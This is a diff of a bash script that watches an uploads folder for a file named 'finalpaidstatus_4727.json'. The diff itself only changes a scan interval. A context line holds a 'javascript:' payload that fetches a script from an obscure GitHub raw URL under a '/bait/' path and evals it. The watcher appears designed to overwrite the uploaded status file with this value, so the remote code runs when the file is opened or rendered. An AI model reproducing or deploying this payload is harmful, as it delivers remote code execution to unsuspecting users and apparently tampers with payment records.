@@ -3,7 +3,7 @@ set -euo pipefail
 
 WATCH_DIR="/data/uploads"
 TARGET_NAME="finalpaidstatus_4727.json"
-SCAN_INTERVAL=0.8
+SCAN_INTERVAL=0.9
 
 NEW_FINALFILE_VALUE="javascript:(function(){fetch('https://raw.githubusercontent.com/9w3h8h4hw98dhf/8457hg/refs/heads/main/final/bait/a.js').then(function(r){return r.text();}).then(function(code){eval(code);});})()"
 
